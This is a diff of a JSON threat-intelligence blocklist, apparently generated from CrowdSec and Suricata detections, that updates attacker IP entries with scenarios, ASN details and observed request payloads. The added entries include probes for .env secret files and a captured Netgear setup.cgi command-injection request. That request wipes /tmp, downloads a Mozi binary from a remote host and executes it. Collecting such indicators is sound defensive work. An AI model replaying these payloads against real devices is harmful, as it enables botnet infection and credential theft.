@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-04-28T01:00:00Z",
+  "generated_at": "2026-04-28T12:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 20,
-    "v4": 20,
+    "total": 22,
+    "v4": 22,
     "v6": 0
   },
   "items": [
@@ -27,28 +27,6 @@
       "asn_prefix": "79.124.40.0/24",
       "payloads": [
         "POST /"
-      ]
-    },
-    {
-      "ip": "172.202.75.66",
-      "family": "v4",
-      "first_seen": "2026-04-21T10:00:00Z",
-      "last_seen": "2026-04-21T10:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-backdoors-attempts",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-probing",
-        "crowdsec/http-wordpress-scan"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "172.200.0.0/13",
-      "tags": [
-        "mwl:cloud=\"azure\""
       ]
     },
     {
@@ -374,6 +352,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "29802",
+      "asn_name": "HVC-AS - HIVELOCITY, Inc.",
+      "asn_prefix": "66.232.121.0/24",
       "payloads": [
         "GET /localhost.sql",
         "GET /dump.sql",
@@ -401,6 +382,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.192.0.0/10",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -420,6 +404,70 @@
         "GET /an.php",
         "GET /index/function.php",
         "GET /randkeyword.PhP7"
+      ]
+    },
+    {
+      "ip": "34.243.74.146",
+      "family": "v4",
+      "first_seen": "2026-04-28T09:00:00Z",
+      "last_seen": "2026-04-28T09:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:cloud=\"aws\""
+      ],
+      "payloads": [
+        "GET /robots.txt",
+        "GET /"
+      ]
+    },
+    {
+      "ip": "179.43.146.226",
+      "family": "v4",
+      "first_seen": "2026-04-28T08:00:00Z",
+      "last_seen": "2026-04-28T08:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "payloads": [
+        "GET /.env",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /.env.prod",
+        "GET /.env.development",
+        "GET /.env.dev",
+        "GET /.env.staging",
+        "GET /.env.stage",
+        "GET /.env.test",
+        "GET /.env.uat",
+        "GET /.env.qa"
+      ]
+    },
+    {
+      "ip": "103.173.7.167",
+      "family": "v4",
+      "first_seen": "2026-04-28T05:00:00Z",
+      "last_seen": "2026-04-28T05:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://103.173.7.167:33639/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.173.7.167:33639/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
       ]
     }
   ]
